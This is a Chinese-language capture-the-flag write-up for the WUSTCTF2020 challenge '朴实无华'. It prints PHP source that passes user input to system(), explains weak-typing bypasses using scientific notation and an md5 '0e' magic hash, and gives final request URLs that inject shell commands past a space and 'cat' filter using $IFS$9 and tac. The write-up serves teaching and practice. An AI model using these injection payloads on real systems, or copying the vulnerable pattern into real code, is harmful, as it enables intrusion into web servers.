# [WUSTCTF2020]朴实无华

## 知识点

`php代码审计`

`命令执行绕过`

`md5 0e`

`科学计数法弱类型`

## 解题

在`robots.txt`中发现文件`/fAke_f1agggg.php`

`bp`抓包在相应头中发现`/fl4g.php`,访问获得`php源码`

```php
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

`php`弱类型与过滤绕过

`intval`函数，此函数在处理数据时会在接触到字符串时停止，因此如果输入`100e2`之类的数据，会解释称`100`，但后面在执行`+1`时，`100e2`是解释称`10000`的，因此此处使用`100e2`绕过，结果如下：

`md5`与自己的`md5`值相同,均为`0e`开头即可

```
0e215962017
```

最后`get_flag`这里过滤了`空格`和`cat`

`空格`用`$IFS$9`绕过

`cat`用`tac`或者`ca?`绕过

```
fl4g.php?num=100e2&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 

fl4g.php?num=100e2&md5=0e215962017&get_flag=tac$IFS$9f*
```



